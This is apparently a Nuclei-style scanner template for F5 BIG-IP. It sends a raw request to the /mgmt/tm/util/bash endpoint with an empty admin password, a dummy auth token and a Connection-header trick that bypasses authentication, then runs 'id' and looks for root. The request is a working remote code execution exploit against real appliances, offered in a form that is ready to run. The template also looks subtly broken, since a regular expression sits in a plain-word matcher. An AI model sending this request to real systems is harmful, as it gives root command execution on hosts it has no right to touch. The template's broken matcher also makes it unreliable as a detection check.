script_name: F5 BIG-IP Authenticated RCE (Root Privilege Verification)
content:
id: F5-BIG-IP-Auth-RCE-Root

info:
  name: F5 BIG-IP Authenticated RCE (Root Privilege Verification)
  author: your_name
  severity: critical
  description: |
    Detects authenticated remote code execution with root privileges
    via the /mgmt/tm/util/bash endpoint in F5 BIG-IP.
  reference:
    - https://support.f5.com/csp/article/K03009991
  tags: f5,big-ip,rce,authenticated,root

http:
- raw:
  - |-
    @timeout: 30s
    POST /mgmt/tm/util/bash HTTP/1.1
    Host: {{Hostname}}
    Authorization: Basic YWRtaW46
    X-F5-Auth-Token: a
    Connection: close, X-F5-Auth-Token
    Content-Length: 39

    {"command":"run","utilCmdArgs":"-c id"}

  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '"commandResult":".*?uid=0\(root\).*?gid=0\(root\).*?groups=0\(root\)"'
    condition: and
